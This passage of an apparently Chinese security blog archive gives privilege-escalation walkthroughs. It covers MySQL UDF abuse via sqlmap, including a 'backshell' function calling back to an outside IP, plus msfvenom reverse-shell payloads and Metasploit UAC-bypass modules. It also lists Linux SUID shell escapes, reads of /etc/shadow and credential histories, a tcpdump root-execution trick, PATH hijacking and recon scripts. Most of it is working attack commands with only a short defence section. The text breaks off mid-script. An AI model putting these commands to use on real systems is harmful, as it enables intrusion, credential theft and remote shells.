lib_mysqludf_sys到MySQL插件目录,激活存储过程sys_exec函数</span><br><span class="line">python sqlmap.py -u &apos;http://xxxx&apos; --sql-shell</span><br><span class="line">    show variables like &quot;%plugin%&quot;;</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &apos;http://xxxx&apos; --file-write=/lib_mysqludf_sys.so </span><br><span class="line">--file-dest=/usr/lib/mysql/plugin/</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &apos;http://xxxx&apos; --sql-shell</span><br><span class="line">    CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so</span><br><span class="line">    SELECT * FROM information_schema.routines</span><br><span class="line">    sys_exec(id);</span><br></pre></td></tr></table></figure><p>存在外联的情况下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -d &quot;mysql://root:root@10.10.10.10:3306/mysql&quot; --os-shell</span><br><span class="line">语法 DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME 或者是DBMS://DATABASE_FILEPATH。</span><br><span class="line">[1]dbms:代表所使用的数据库，如我们这里是mysql</span><br><span class="line">[2]user:对应我们数据库的用户，如我们这里是root</span><br><span class="line">[3]password:对应我们数据的密码，如我的服务器为root</span><br><span class="line">[4]dbma_IP:数据库服务器对应的ip地址，如我这里为10.10.10.10</span><br><span class="line">[5]dbms_PORT:数据服务器所使用的端口</span><br><span class="line">[6]database_NAME:你要使用的数据库名</span><br></pre></td></tr></table></figure><p><strong>5. UDF提权总结与防范</strong></p><p>有webshell的提权</p><p>不多说,直接上udf马儿</p><p>无webshell的提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select version(); //获取mysql版本 </span><br><span class="line">select @@basedir; //查找到mysql的目录 </span><br><span class="line">SHOW VARIABLES LIKE &apos;%plugin%&apos; //查看高版本插件位置</span><br></pre></td></tr></table></figure><p>通过查询将udf.dll转成代码插入数据库，然后导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use mysql; </span><br><span class="line">set @a=concat(&apos;&apos;,0x代码); </span><br><span class="line">create table Ghost(data LONGBLOB); </span><br><span class="line">insert into Ghost values(&quot;&quot;);update Ghost set data = @a; </span><br><span class="line">代码为select hex(load_file(&apos;c:/udf.dll&apos;))中的内容 </span><br><span class="line">select data from Ghost into dumpfile &apos;c:/phpStudy/MySQL/lib/plugin/udf.dll&apos;; //导出ufd.dll </span><br><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &apos;udf.dll&apos;;//创建函数 </span><br><span class="line">select backshell(&quot;10.10.10.10&quot;,4444);</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python root.py -a 127.0.0.1 -p root -e &quot;ver&amp;whoami&quot; -m udf </span><br><span class="line">python root.py -a 127.0.0.1 -p root -e &quot;ver&amp;whoami&quot; -m lpk </span><br><span class="line">python root.py -a 127.0.0.1 -p root -e &quot;ver&amp;whoami&quot; –m st</span><br></pre></td></tr></table></figure><p><strong>6. 安全防范方法</strong></p><p>尽量避免提供对外链接，通过mysql中的user表进行查看，禁用”%”。<br>设置复杂的Root账号密码。<br>对my.ini设置只读属性，设置plugin目录为只读目录。</p>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升(系统提权)</title>
      <link href="/2019/07/08/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83)/"/>
      <url>/2019/07/08/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83)/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h2 id="错误系统配置提权"><a href="#错误系统配置提权" class="headerlink" title="错误系统配置提权"></a>错误系统配置提权</h2><p>以管理员权限或者系统权限运行web服务 </p><p><strong>任意用户以NT AUTHORITY\SYSTEM权限安装msi</strong></p><p>提权脚本</p><p>PowerUP<a href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1" target="_blank" rel="noopener">https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1</a></p><p>ElevateKit<a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">https://github.com/rsmudge/ElevateKit</a></p><h2 id="ByPassUAC"><a href="#ByPassUAC" class="headerlink" title="ByPassUAC"></a>ByPassUAC</h2><h3 id="1-metasploit绕过UAC"><a href="#1-metasploit绕过UAC" class="headerlink" title="1. metasploit绕过UAC"></a>1. metasploit绕过UAC</h3><p>首先对目标机器进行漏洞利用以获取meterpreter会话。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.29 LPORT=6666 -f exe &gt;./shell.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/shell_reverse_tcp </span><br><span class="line">set lport 6666</span><br><span class="line">set lhost 192.168.10.29</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>获得meterpreter会话1后，输入以下命令以检查系统权限和特权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p>如果你没有系统/管理员权限，那么你就需要绕过目标系统的UAC保护。</p><p><strong>Windows升级UAC保护绕过</strong></p><p>此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>从下图可以看到，又建立了一个meterpreter会话2连接，现在输入getsystem和getuid两条命令来查看系统权限：</p><p>获得了NT AUTHORITY\SYSTEM权限。现在只要输入shell命令，就会进入一个具有管理员权限的命令行窗口。</p><p><strong>Windows升级UAC保护绕过（内存注入绕过）</strong></p><p>此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块使用反射DLL注入技术仅删除DLLpayload二进制文件而不是删除标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构（对于SYSWOW64系统也使用x64）。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><strong>Windows UAC保护绕过（FodHelper注册表键值绕过）</strong></p><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><strong>Windows升级UAC保护绕过（Eventvwr注册表键值绕过）</strong></p><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入自定义命令，这个命令将在启动Windows fodhelper.exe应用程序时调用来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><strong>Windows升级UAC保护绕过（COM Handler劫持绕过）</strong></p><p>此模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。加载某些高完整性进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话升级的payload。在payload调用后清除注册表项修改。此模块要求payload的体系结构与OS匹配，但当前的低权限Meterpreter会话的体系结构并不相同。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果限制cmd.exe访问，则此模块将无法正常运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac_comhijack</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="2-powershell绕过UAC"><a href="#2-powershell绕过UAC" class="headerlink" title="2. powershell绕过UAC"></a>2. powershell绕过UAC</h3><p><strong>1. UACME</strong></p><p>利用 <code>nishang</code> 的 <code>Escalation（提权）</code> 目录的 <code>Invoke-PsUACme.ps1</code></p><p>打开通过反弹shell方式获取到目标PC的Ppowershell</p><table><thead><tr><th>Windows版本</th><th>Powershell版本</th></tr></thead><tbody><tr><td>win7    / Windows Server 2008</td><td>2.0</td></tr><tr><td>win8    / Windows Server 2012</td><td>3.0</td></tr><tr><td>win8.1 / Windows Server 2012 R2</td><td>4.0</td></tr><tr><td>win10  / Windows Server 2016</td><td>5.1</td></tr></tbody></table><p>powershell简单命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#获取当前版本</span><br><span class="line">get-host</span><br><span class="line">$PSVersionTable</span><br><span class="line">#允许执行的脚本类型</span><br><span class="line">Get-ExecutionPolicy</span><br><span class="line"></span><br><span class="line">Restricted#不允许执行脚本</span><br><span class="line">RemoteSigned#可以执行本地脚本，网上的不行</span><br><span class="line">allsigned#对签名的脚本才能执行</span><br><span class="line">unrestricted#设置脚本运行策略</span><br><span class="line"></span><br><span class="line">Set-ExecutionPolicy</span><br></pre></td></tr></table></figure><p>导入脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-PsUACme.ps1</span><br><span class="line">Invoke-PsUACme -verbose #使用sysprep方式执行默认的payload</span><br><span class="line">C:\Windows\System32\Sysprep\sysprep.exe</span><br><span class="line"></span><br><span class="line">Invoke-PsUACme -method oobe -verbose #使用oobe的方式执行payload</span><br></pre></td></tr></table></figure><h3 id="3-Bypass-UAC"><a href="#3-Bypass-UAC" class="headerlink" title="3. Bypass-UAC"></a>3. Bypass-UAC</h3><p>框架</p><h3 id="4-Yamabiko"><a href="#4-Yamabiko" class="headerlink" title="4. Yamabiko"></a>4. Yamabiko</h3><ul><li>使用IFileOperation COM接口</li><li>使用Wusa.exe的extract选项</li><li>远程注入SHELLCODE 到傀儡进程</li><li>DLL劫持，劫持系统的DLL文件</li><li>eventvwr.exe and registry hijacking</li><li>sdclt.exe</li><li>SilentCleanup</li><li>wscript.exe</li><li>cmstp.exe</li><li>修改环境变量，劫持高权限.Net程序</li><li>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</li><li>直接提权过UAC</li></ul><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="错误系统配置提权-1"><a href="#错误系统配置提权-1" class="headerlink" title="错误系统配置提权"></a>错误系统配置提权</h2><p><strong>系统服务的错误权限配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure><p><strong>不安全的文件/文件夹权限配置</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure><p><strong>计划任务</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p><strong>找存储的明文用户名和密码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span><br></pre></td></tr></table></figure><h2 id="利用SUID提权"><a href="#利用SUID提权" class="headerlink" title="利用SUID提权"></a>利用SUID提权</h2><p>参考链接：<a href="https://evi1cg.me/archives/SUID_Privilege_Escalation.html" target="_blank" rel="noopener">https://evi1cg.me/archives/SUID_Privilege_Escalation.html</a></p><p>自行添加suid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s ./door</span><br></pre></td></tr></table></figure><p>找有SUID标志位的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><strong>老版本nmap(2.02-5.21)</strong></p><p>有 interactive，是允许用户执行系统命令的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2# whoami</span><br></pre></td></tr></table></figure><p>msf模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure><p><strong>find</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure><p><strong>vim/vi</strong></p><p>打开vim,按下ESC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p><strong>bash</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</span><br></pre></td></tr></table></figure><p><strong>less</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><p><strong>more</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more /home/pelle/myfile</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><p><strong>cp</strong></p><p>使用cp覆盖 /etc/shadow</p><p><strong>mv</strong></p><p>使用mv 覆盖 /etc/shadow 或者/etc/sudoers</p><p><strong>awk</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</span><br></pre></td></tr></table></figure><p><strong>man</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><p><strong>python/perl/ruby/lua/etc</strong></p><p>perl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/bash&quot;;</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure><p><strong>tcpdump</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $&apos;id\ncat /etc/shadow&apos; &gt; /tmp/.test</span><br><span class="line">chmod +x /tmp/.test</span><br><span class="line">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</span><br></pre></td></tr></table></figure><p><strong>scp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string s</span><br><span class="line">echo -ne &apos;#!/bin/bash\n/bin/bash -i&apos; &gt; /tmp/scp</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">echo $PATH</span><br><span class="line">chmod +x /tmp/scp</span><br><span class="line">./s</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升(信息收集)</title>
      <link href="/2019/07/07/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)/"/>
      <url>/2019/07/07/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87(%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)/</url>
      
        <content type="html"><![CDATA[<h2 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h2><ol><li><p>直接提权</p></li><li><p>间接提权</p></li><li><p>本地提权</p></li><li><p>远程提权</p></li><li><p>操作系统提权</p></li><li><p>应用程序提权</p></li></ol><ul><li>内核提权（IIS6、iis7、pr、ms2-020、巴西烤肉）</li><li>服务提权（各种数据库，第三方软件）</li><li>配置错误（Web、server-U）</li></ul><p><strong>内核提权：</strong></p><p>[Windows]</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a><br>[Linux]</p><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></p><p><strong>服务提权：</strong></p><ul><li>数据库服务</li><li>ftp等</li></ul><p>最高权限账号System、 Root</p><h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><blockquote><p>在系统中执行cmd，执行不了就自己上传一个</p><p>网站中禁用了系统命令函数，则不能利用系统漏洞提权</p></blockquote><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><ul><li>批处理脚本</li><li>针对系统的分析脚本</li><li>系统命令分析</li></ul><p><strong>1. 常用命令</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo#类型、版本、位数、已安装的补丁</span><br><span class="line">ipconfig /all#是否为独立ip地址、DNS、计算机名称</span><br><span class="line">net user #用户信息</span><br><span class="line">whoami#当前用户权限</span><br><span class="line">netstat -ano#端口开放情况</span><br><span class="line">tasklist#进程服务（服务名称、PID）</span><br><span class="line">net start/stopservername#开启/关闭某些服务</span><br><span class="line">dir /B /S *.doc#查找敏感文件</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f  #开启远程桌面</span><br><span class="line">mstsc#连接</span><br><span class="line">#网络连接</span><br></pre></td></tr></table></figure><p>查看注册表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#查看3389</span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections#0表示开启，1表示关闭</span><br><span class="line">#查看当前远程端口</span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</span><br><span class="line">set /a a=0xd3d</span><br></pre></td></tr></table></figure><p><strong>2. 批处理脚本</strong></p><p>信息收集脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">echo <span class="comment">#########system info collection</span></span><br><span class="line">systeminfo</span><br><span class="line">ver</span><br><span class="line">hostname</span><br><span class="line">net user</span><br><span class="line">net localgroup</span><br><span class="line">net localgroup administrators</span><br><span class="line">net user guest</span><br><span class="line">net user administrator</span><br><span class="line">echo <span class="comment">#######at- with atq#####</span></span><br><span class="line">echo schtask /query</span><br><span class="line">echo</span><br><span class="line">echo <span class="comment">####task-list#############</span></span><br><span class="line">tasklist /svc</span><br><span class="line">echo</span><br><span class="line">echo <span class="comment">####net-work infomation</span></span><br><span class="line">ipconfig/all</span><br><span class="line">route print</span><br><span class="line">arp -a</span><br><span class="line">netstat -anipconfig /displaydns</span><br><span class="line">echo</span><br><span class="line">echo <span class="comment">#######service############</span></span><br><span class="line">sc query type= service state= all</span><br><span class="line">echo <span class="comment">#######file-##############</span></span><br><span class="line">cd \</span><br><span class="line">tree -F</span><br></pre></td></tr></table></figure><p>vbs脚本</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">'获取硬件性息的vbs脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">REM</span> <span class="comment">'获取IP地址'</span></span><br><span class="line"><span class="keyword">REM</span> <span class="comment">'判断DNS是否为空，判断IP地址开头是否为10或192'</span></span><br><span class="line">strComputer = <span class="string">"."</span></span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span 